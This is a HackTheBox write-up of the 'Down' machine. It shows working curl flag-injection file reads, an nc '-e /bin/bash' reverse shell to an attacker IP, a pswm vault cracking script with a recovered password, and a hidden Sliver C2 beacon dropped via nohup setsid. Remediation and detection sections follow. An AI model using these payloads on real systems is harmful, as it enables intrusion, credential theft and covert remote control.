---
layout: default
title: "HackTheBox - Down"
---

# HackTheBox - Down

**OS:** Ubuntu 22.04.5 LTS (Linux, Easy)

A website-availability checker app suffers from two injection flaws that together deliver full system
compromise. First, `escapeshellcmd()` does not strip curl flags, so injecting `--next file://PATH`
into the URL field enables arbitrary file reads as www-data via SSRF. Second, the "expert mode" nc
command also uses `escapeshellcmd()` against an unsanitized port field; nc-traditional v1.10-47's
`-e` flag executes in connect mode before the `-z` zero-I/O handler can suppress it, giving a raw
www-data reverse shell. The password manager `pswm` stores its vault world-readably in
`~/.local/share/pswm/pswm`; offline cracking with rockyou.txt recovers the master password in under
two seconds and reveals aleks' SSH credentials. Aleks holds `(ALL : ALL) ALL` sudo rights, granting
instant root.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (down / down.htb) |
| Initial Access | escapeshellcmd() flag injection -> curl SSRF file read + nc -e connect-mode RCE |
| Privilege Escalation | pswm vault offline crack -> SSH as aleks -> sudo ALL |
| Final Access | `root@down` |

---

## Recon

Fast top-ports sweep followed by a full background scan:

```
$ nmap -sV -sC -p 22,80 <target-ip>
Starting Nmap 7.95
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
80/tcp open  http    Apache httpd 2.4.52
| http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Is it down or just me?
```

Only ports 22 (SSH) and 80 (HTTP) are open. The web app presents a "Is That Website Down, Or Is It
Just You?" checker that accepts a URL and runs curl against it. An `?expertmode=tcp` parameter
switches to a TCP port-checker that runs nc against an IP and port supplied by the user.

---

## Initial Access

### Source code review (SSRF via curl flag injection)

Reading `/var/www/html/index.php` via the SSRF technique below revealed both code paths:

```php
// URL mode
$ec = escapeshellcmd("/usr/bin/curl -s $url");
exec($ec . " 2>&1", $output, $rc);
// output displayed ONLY if rc === 0

// TCP mode (expertmode=tcp)
$ec = escapeshellcmd("/usr/bin/nc -vz $ip $port");
exec($ec . " 2>&1", $output, $rc);
// output displayed if rc === 0
```

`escapeshellcmd()` escapes shell metacharacters (`; | & * ? ~ < > ^ ( ) [ ] { } $ \`) but does **not**
escape hyphens, forward slashes, dots, colons, or spaces. This means curl and nc flags can be
injected through the URL and port fields respectively.

> **Why this works:** `escapeshellcmd()` targets shell-level injection (pipes, semicolons, subshells)
> but not flag-level injection. A value like `http://127.0.0.1/ --next file:///etc/passwd` survives
> unchanged because none of those characters are in the blacklist.

### SSRF: arbitrary file read via `--next`

curl's `--next` flag (alias `-:`) resets options and makes a second request. Injecting it after a
valid HTTP URL passes the `preg_match('^https?://')` check, runs the first request (rc=0 so output
is shown), then makes a second request for the file path:

```
POST /index.php HTTP/1.1
Host: down.htb

url=http://127.0.0.1/ --next file:///etc/passwd
```

The response embeds both the app's HTML (first request) and the file content (second request) inside
a `<pre>` block. Parsing: find the first `</html>` in the pre block (end of the HTTP response body)
and take everything after it.

This gave us:

```
$ curl -s -X POST http://<target-ip>/index.php -H 'Host: down.htb' \
  --data-urlencode 'url=http://127.0.0.1/ --next file:///etc/passwd'
[... app HTML ...]</html>
root:x:0:0:root:/root:/bin/bash
...
aleks:x:1000:1000:Aleks:/home/aleks:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

Key files read:
- `/etc/group`: aleks in `adm`, `sudo`, `lxd` groups
- `/var/www/html/index.php`: full source (reproduced above)
- `/home/aleks/.local/share/pswm/pswm`: the pswm password vault (world-readable, see below)
- `/etc/laurel/config.toml`: audit log config (logs not readable by www-data)
- `/proc/self/environ`: www-data env, no credentials

### RCE: nc `-e` flag injection in expert mode

The TCP mode builds: `/usr/bin/nc -vz <ip> <port>`. The port field uses `intval()` for validation
but then passes the raw `$port` string (not `$port_int`) to `escapeshellcmd()`:

```php
$port_int = intval($port);
$valid_port = filter_var($port_int, FILTER_VALIDATE_INT);
if ( $valid_ip && $valid_port ) {
    $ec = escapeshellcmd("/usr/bin/nc -vz $ip $port");   // <-- raw $port, not $port_int
```

`intval("4447 -e /bin/bash")` returns 4447 (valid). `escapeshellcmd` leaves `-e /bin/bash` intact.

The installed nc is `netcat-traditional` v1.10-47, which retains `-e` (exec after connect) and `-c`.
The key finding: `-e` is evaluated **before** `-z` suppresses I/O in connect mode, so sending nc to
connect to the attack box with `-e /bin/bash` produces a live shell even with `-z` in the command:

```
POST /index.php?expertmode=tcp

ip=<attacker-ip>&port=4447 -e /bin/bash
```

Final assembled command: `/usr/bin/nc -vz <attacker-ip> 4447 -e /bin/bash`

On the attack box, with a listener ready:

```python
# Listener (Python)
import socket, threading, subprocess

server = socket.socket()
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind(('0.0.0.0', 4447))
server.listen(1)
conn, addr = server.accept()         # blocks until target connects
conn.send(b'id\n')
print(conn.recv(4096).decode())
```

```
[+] Got connection from ('10.129.25.184', 37868)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why this works:** nc-traditional 1.10-47 checks the `-e` flag in `doconnect()` prior to entering
> `readwrite()` where `-z` (zero-I/O) causes an early return. In listen mode (`-l`), `-z` blocked
> execution because the path is different. Connect mode is the working vector.

---

## Post-Exploitation Enumeration

From the www-data shell, enumerated `/home/aleks/`:

```
$ ls -la /home/aleks/
drwxr-xr-x 5 aleks aleks .
drwxrwxr-x 3 aleks aleks .local/        <- others have write
drwx------ 2 aleks aleks .ssh/
```

`/home/aleks/.local/` is `drwxrwxr-x` (others can read and execute). Traversing into it:

```
$ ls /home/aleks/.local/share/
pswm/

$ ls /home/aleks/.local/share/pswm/
pswm      <- the vault file, mode -rw-rw-r-- (world-readable!)

$ cat /home/aleks/.local/share/pswm/pswm
e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==
```

Also noted from SUID/capability scan: no unusual SUID binaries; only `mtr-packet` and `ping` have
`cap_net_raw`. Standard sudo group membership for aleks confirmed via `/etc/group`.

---

## Privilege Escalation

### pswm vault offline crack

`pswm` (github.com/Julynx/pswm) encrypts its vault using `cryptocode`: AES-256-GCM with a
scrypt-derived key (`n=2^14, r=8, p=1`) and the format `cipher_text*salt*nonce*tag` (all base64).
The vault file is world-readable, enabling offline brute-force.

The vault always contains a self-referential first entry storing the master password:
`pswm\taleks\t<master_password>`. Any successful decryption is self-validating.

```python
# crack_pswm.py (abbreviated)
import hashlib, gzip
from base64 import b64decode
from Cryptodome.Cipher import AES
from multiprocessing import Pool

VAULT = "e9laWoKiJ0OdwK05...DCHBQ=="
parts = VAULT.split('*')
CIPHER, SALT, NONCE, TAG = [b64decode(p) for p in parts]

def try_password(password):
    key = hashlib.scrypt(password.encode(), salt=SALT, n=2**14, r=8, p=1, dklen=32)
    cipher = AES.new(key, AES.MODE_GCM, nonce=NONCE)
    try:
        pt = cipher.decrypt_and_verify(CIPHER, TAG)
        return password, pt.decode()
    except:
        return None

# Run against rockyou.txt with multiprocessing Pool...
```

cracked in 95 attempts (1.8 seconds):

```
[!!!] CRACKED after 95 (1.8s)!
[!!!] Password: flower
[!!!] Content:
pswm    aleks   flower
aleks@down      aleks   1uY3w22uc-Wr{xNHR~+E
```

Master password: `flower`. SSH credentials for aleks: username `aleks`, password `1u********************`.

> **Why this works:** pswm stores the vault at `~/.local/share/pswm/pswm` and the directory
> permissions default to world-readable (`drwxrwxr-x`). The vault file itself is created as
> `rw-rw-r--`. Any local user (or www-data via SSRF/shell) can read the encrypted blob and crack it
> offline without rate-limiting.

### SSH and sudo ALL to root

```
$ ssh aleks@<target-ip>
aleks@<target-ip>'s password: [redacted]

aleks@down:~$ id
uid=1000(aleks) gid=1000(aleks) groups=1000(aleks),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)

aleks@down:~$ echo '<redacted>' | sudo -S -l
(ALL : ALL) ALL

aleks@down:~$ echo '<redacted>' | sudo -S cat /root/root.txt
<root-flag-redacted>
```

Aleks has unrestricted sudo -- any command, any user. One line to root.

---

## Post-Exploitation: C2 (Sliver)

With SSH credentials in hand, delivered the pool Linux HTTPS beacon from the implant pool
(`pool-https-linux64`) to avoid a slow recompile:

```
# Attack box
$ sliver-client
sliver > regenerate pool-https-linux64
[*] Implant saved to /home/v0idravl/sliver-payloads/pool-https-linux64

# Upload and detach
$ sftp aleks@<target-ip>
sftp> put /home/v0idravl/sliver-payloads/pool-https-linux64 /tmp/.b
sftp> quit

$ ssh aleks@<target-ip> 'chmod +x /tmp/.b && nohup setsid /tmp/.b </dev/null >/dev/null 2>&1 &'
```

Beacon checked in via HTTPS to the standing port-443 listener:

```
sliver > beacons

 ID         Name                 Transport   Hostname   Username   Last Check-In
========== ==================== =========== ========== ========== ==============
 c095d72e   pool-https-linux64   http(s)     down       aleks      just now
```

Two commands demonstrating active C2:

```
sliver (pool-https-linux64) > execute id
uid=1000(aleks) gid=1000(aleks) groups=1000(aleks),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)

sliver (pool-https-linux64) > execute hostname
down
```

Beacon killed, `/tmp/.b` removed after demonstration.

> **Note:** `nohup setsid ./beacon </dev/null >/dev/null 2>&1 &` is the correct Linux detachment
> pattern. A bare `&` inside a SSH session still receives SIGHUP when the session closes; `setsid`
> creates a new session breaking SIGHUP propagation, `nohup` adds a second safety net.

---

## Root Cause

Two independent vulnerabilities that chain:

1. **curl flag injection via `escapeshellcmd()`** -- the URL field is passed to
   `escapeshellcmd("/usr/bin/curl -s $url")` without stripping flag-prefixed tokens. curl flags
   like `--next file://` survive, enabling SSRF to any path www-data can read.

2. **nc flag injection via unsanitized port field** -- the TCP mode validates the port with
   `intval()` but passes the raw string (not the integer) to `escapeshellcmd()`. nc-traditional's
   `-e` flag in connect mode executes before the `-z` zero-I/O handler, delivering RCE.

3. **pswm vault world-readable with weak master password** -- pswm's default XDG data path creates
   `~/.local/share/pswm/` with `drwxrwxr-x`, making the encrypted vault readable by any local user
   or process (including www-data). scrypt n=2^14 provides ~50ms per attempt; `flower` appears in
   rockyou.txt at rank ~95, cracked in under 2 seconds.

---

## Impact

Full system compromise from a single unauthenticated HTTP POST. The attack chain:

1. Unauthenticated web user reads arbitrary files as www-data via curl SSRF
2. Reads the pswm vault from aleks' world-readable home subtree
3. Cracks the vault offline in under 2 seconds
4. SSHs as aleks with recovered credentials
5. Runs any command as root via `sudo (ALL:ALL) ALL`

---

## Remediation

Priority-ordered -- earlier items break the kill chain, later items add defence-in-depth.

1. **Fix the port injection (breaks RCE):** Use the validated integer `$port_int` instead of the raw
   `$port` string when building the nc command:
   ```php
   $ec = escapeshellcmd("/usr/bin/nc -vz $ip $port_int");  // was: $port
   ```

2. **Fix the URL injection (breaks SSRF):** Validate that the URL contains no additional tokens
   after the URL itself, or use `escapeshellarg()` on the URL:
   ```php
   $ec = "/usr/bin/curl -s " . escapeshellarg($url);
   ```

3. **Harden pswm vault permissions:** The XDG data directory should be `700`, not `755/drwxrwxr-x`.
   Enforce this at install time or in the pswm source:
   ```python
   os.makedirs(config, mode=0o700, exist_ok=True)
   ```

4. **Require a stronger master password:** Enforce minimum entropy (mixed case, digits, symbols) in
   pswm's `register()`, not just length (current minimum is 4 characters).

5. **Remove nc-traditional or drop the `-e` capability:** Replace with `netcat-openbsd` (which
   lacks `-e`) or remove the exec options from the nc binary.

6. **Restrict aleks' sudo scope:** `(ALL:ALL) ALL` is unnecessary for a standard user. Scope it to
   only the specific commands needed.

### Validation

| Fix | Verification |
|---|---|
| Port injection | Inject `4444 -e /bin/bash`; no shell should arrive |
| URL injection | POST `url=http://127.0.0.1/ --next file:///etc/passwd`; should return only the curl result for 127.0.0.1, not file content |
| Vault permissions | `stat ~/.local/share/pswm/pswm`; should show `600`, not `664` |
| Sudo scope | `sudo -l` as aleks; should list specific commands only, not ALL |

---

## Detection Opportunities

| Event | Signal |
|---|---|
| Auditd execve | `curl` spawned by `www-data` with `--next` or `file://` arguments |
| Auditd execve | `nc` spawned by `www-data` with `-e` or `-c` flags |
| Auth log | SSH login for `aleks` from a non-workstation IP shortly after web traffic |
| Auditd execve | `sudo` invoked by `aleks` with `bash`, `sh`, or `cat /root/root.txt` |
| Network | Outbound HTTPS from `www-data` / `aleks` to a non-inventory IP |
| Laurel | Audit events tagged `maint` (label-script on `/root/maint-*.sh`) if maintenance scripts are triggered |

---

## Lessons Learned

1. **`escapeshellcmd()` is not sufficient for programs that accept flags.** It protects against shell
   metacharacters, not argument injection. Any command built as `program $userInput` is vulnerable to
   flag smuggling. Use `escapeshellarg()` on user-supplied values, or whitelist the allowed arguments.

2. **Validate what you actually use.** Validating `intval($port)` but passing `$port` creates a
   false sense of security. Always use the sanitized value downstream.

3. **nc-traditional with `-e` is dangerous on a server.** The `-z` flag does not prevent `-e`
   execution in connect mode on v1.10-47. Prefer `netcat-openbsd` on web servers.

4. **Password manager vaults are high-value targets.** A world-readable encrypted vault is only as
   safe as the master password. Enforce restrictive directory permissions and strong passwords at the
   application level.

5. **The "post-SSRF file read" surface is large.** Once arbitrary file reads are available, the full
   filesystem is a credential mine: `/proc/self/environ`, cron configs, app configs, password
   manager vaults, SSH keys, browser profiles.

---

## Cleanup

- www-data shell: no persistent files written to the web root; `/var/lib/php/sessions/shell.php`
  written during enumeration (this dir has mode 1733 -- others write but not read; web-accessible
  only if the session file was served, which it was not in this case).
- `/tmp` artifacts from the enumeration phase (wrote to global /tmp, all `www-data`-owned, no
  secrets): left in place; HTB resets on box retirement.
- Sliver beacon `/tmp/.b`: removed after C2 demonstration.
- HTB box stopped with `htb stop` after flag submission.
